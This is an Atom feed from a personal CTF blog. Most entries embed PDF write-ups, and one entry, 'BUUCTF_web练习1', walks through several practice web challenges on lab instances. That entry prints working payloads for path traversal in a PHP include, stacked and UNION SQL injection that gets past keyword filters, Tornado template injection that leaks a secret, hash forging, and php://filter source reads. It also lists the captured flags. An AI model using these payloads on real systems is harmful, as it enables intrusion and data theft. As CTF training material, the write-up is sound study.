<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damya&#39;s Blog</title>
  
  <subtitle>あややこやや</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.damyahome.github.io/"/>
  <updated>2020-09-25T13:22:09.933Z</updated>
  <id>https://www.damyahome.github.io/</id>
  
  <author>
    <name>Damya</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF web练习2</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A02/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A02/</id>
    <published>2020-09-25T13:20:04.000Z</published>
    <updated>2020-09-25T13:22:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧</p><p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="BUUCTF_web练习2.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧&lt;/p&gt;
&lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;BUUCTF_web练习2.pdf&quot; width=&quot;100%&quot; height
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>[MISC]拼图题小结</title>
    <link href="https://www.damyahome.github.io/MISC-%E6%8B%BC%E5%9B%BE%E9%A2%98%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/MISC-%E6%8B%BC%E5%9B%BE%E9%A2%98%E5%B0%8F%E7%BB%93/</id>
    <published>2020-09-24T13:20:28.000Z</published>
    <updated>2020-09-24T13:23:21.529Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="[MISC]拼图题小结.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;[MISC]拼图题小结.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="知识小结" scheme="https://www.damyahome.github.io/tags/%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>web for pentester 1 wp</title>
    <link href="https://www.damyahome.github.io/web-for-pentester-1-wp/"/>
    <id>https://www.damyahome.github.io/web-for-pentester-1-wp/</id>
    <published>2020-09-24T08:03:04.000Z</published>
    <updated>2020-09-24T08:05:32.238Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="web_for_pentester_1_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;web_for_pentester_1_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="靶场练习" scheme="https://www.damyahome.github.io/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_web练习1</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A01/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A01/</id>
    <published>2020-09-23T13:13:38.000Z</published>
    <updated>2020-09-23T13:45:38.330Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><a href="http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn" target="_blank" rel="noopener">http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn</a></p><p>查看源码看到提示source.php,访问之,得到源码,审计之</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//$whitelist变量只包含source.php和hint.php,isset函数检测变量是否声明,is_string函数检测变量是否为字符串,in_array函数检测数组中是否匹配$whitelist</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//mb_substr返回$page字符串从头开始,到mb_strpos查找?在$page中首次出现的位置的一段长度的字符,即如果$page有?,则截取?前的字符串</span></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//对$page进行解码,并再截取一遍</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"><span class="comment">//empty检查变量file是否为空,并is_string判断是否为字符串,并且要能访问,条件都满足就包含file传入的文件进行访问</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问hint.php试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?file=hint.php</span><br><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br><span class="line">/?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p><p>flag{3e11f910-1c51-453c-af9a-029edd269163}</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><a href="http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn" target="_blank" rel="noopener">http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos; //报错,存在sql注入</span><br><span class="line">尝试select提示被过滤</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+databases;  //尝试堆叠注入查看数据库</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+tables+from+supersqli;  //查表</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+columns+from+`1919810931114514`;  //查列</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>因为show最多只能查询到字段名,无法查询具体数据,所以还是需要绕过过滤,这里用的是预编译法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;use supersqli;set @sql=concat(&apos;s&apos;,&apos;elect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{940f9932-6f3f-4507-a641-e91163cb4e03}</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><a href="http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn" target="_blank" rel="noopener">http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn</a></p><p>尝试输入1,发现是post传参的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=1</span><br><span class="line">query=1;show databases;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;show tables;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>而后发现from被过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=*,1  ==&gt;  select *,1 || flag from flag</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">官方解法</span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br><span class="line">构造成</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag</span><br><span class="line">其中PIPES_AS_CONCAT能将||视为字符串连接符而非或运算符</span><br><span class="line">实际运行为</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select &quot;1&quot;+flag from Flag</span><br></pre></td></tr></table></figure><p>flag{22da20ee-17da-4f57-8a47-643580b0d03b}</p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><a href="http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn" target="_blank" rel="noopener">http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>直接手注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos;and+&apos;1&apos;=&apos;2&apos;+union+select+1,2,&apos;3</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{9da954e2-3523-4bdb-8beb-77c5c4b905ac}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><a href="http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn" target="_blank" rel="noopener">http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn</a></p><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>根据提示传入参数使得cat=dog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{7d14e194-7772-4d41-8c61-fb1a0388b25e}</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p><a href="http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn" target="_blank" rel="noopener">http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>挨个访问得到信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/flag.txt&amp;filehash=4d81edafee08fa38738a59e9fd150d50</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">/file?filename=/welcome.txt&amp;filehash=27f929d16f4606d46be11db34391a228</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">/file?filename=/hints.txt&amp;filehash=bfc06735e011c9552a2fdb9f07e6dccc</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>根据规律需要构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(fllllllllllllag))</span><br></pre></td></tr></table></figure></p><p>先看看render,是个调用 res.render({options}) 去向模板中渲染数据, 可以把视图响应给客户端的渲染函数,尝试抓包访问fllllllllllllag文件<br><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>根据/error?msg=Error提示可以用error变量读取文件,查一下tornado里cookie_secret的位置</p><p><a href="https://www.tornadoweb.org/en/latest/guide/security.html" target="_blank" rel="noopener">https://www.tornadoweb.org/en/latest/guide/security.html</a>在handler/settings文件里</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>cookie_secret:0a2781d2-6438-4103-8978-926c5e109fc8</p><p>接下来根据提示写个脚本加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret = <span class="string">'0a2781d2-6438-4103-8978-926c5e109fc8'</span></span><br><span class="line">md5.update(filename.encode(<span class="string">"utf8"</span>))</span><br><span class="line">file_md5 = md5.hexdigest()</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(cookie_secret + file_md5)</span><br><span class="line">filehash = md5.hexdigest()</span><br><span class="line"><span class="keyword">print</span> filehash</span><br></pre></td></tr></table></figure><p>得到 022b103d797804318dc8eb68133d1dcc<br><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>flag{c14f33f9-d55a-4416-8215-e0468fe7f9c0}</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p><a href="http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn" target="_blank" rel="noopener">http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn</a></p><p>查看源码,找到可疑页面</p><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure><p>继续看源码</p><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>然后直接end了,提示回去看看</p><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure><p>Archive_room.php –&gt; end.php</p><p>抓个包看看,发现跳板是action.php</p><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><p>访问secr3t.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="comment">//strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE,这个函数区分大小写,stristr()函数不区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>根据代码需要用到base64读取文件源码的伪协议,构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><p>解base64得源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">"background-color:black;"</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">"font-family:arial;color:red;font-size:20px;text-align:center;"</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"我就在这里"</span>;</span><br><span class="line">                $flag = <span class="string">'flag&#123;1c5044a3-10a5-4073-8bc3-a56134196d35&#125;'</span>;</span><br><span class="line">                $secret = <span class="string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>flag{1c5044a3-10a5-4073-8bc3-a56134196d35}</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><a href="http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn" target="_blank" rel="noopener">http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn</a></p><p>根据网址 /?file=flag.php</p><p>想到文件包含,先伪协议读一波源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>解base64后<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;ba49b5dd-32ae-45f4-8fce-ea258e0807ca&#125;</span></span><br></pre></td></tr></table></figure></p><p>flag{ba49b5dd-32ae-45f4-8fce-ea258e0807ca}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HCTF-2018-WarmUp&quot;&gt;&lt;a href=&quot;#HCTF-2018-WarmUp&quot; class=&quot;headerlink&quot; title=&quot;[HCTF 2018]WarmUp&quot;&gt;&lt;/a&gt;[HCTF 2018]WarmUp&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;htt
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GINKGO大废物杯_wp</title>
    <link href="https://www.damyahome.github.io/GINKGO%E5%A4%A7%E5%BA%9F%E7%89%A9%E6%9D%AF-wp/"/>
    <id>https://www.damyahome.github.io/GINKGO%E5%A4%A7%E5%BA%9F%E7%89%A9%E6%9D%AF-wp/</id>
    <published>2020-09-23T13:06:12.000Z</published>
    <updated>2020-09-23T13:08:32.116Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="GINKGO大废物杯_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;GINKGO大废物杯_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Ginkgo废物杯_web1高地_复现</title>
    <link href="https://www.damyahome.github.io/Ginkgo%E5%BA%9F%E7%89%A9%E6%9D%AF-web1%E9%AB%98%E5%9C%B0-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/Ginkgo%E5%BA%9F%E7%89%A9%E6%9D%AF-web1%E9%AB%98%E5%9C%B0-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T13:05:35.000Z</published>
    <updated>2020-09-23T13:07:38.989Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="Ginkgo废物杯_web1高地_复现.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;Ginkgo废物杯_web1高地_复现.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
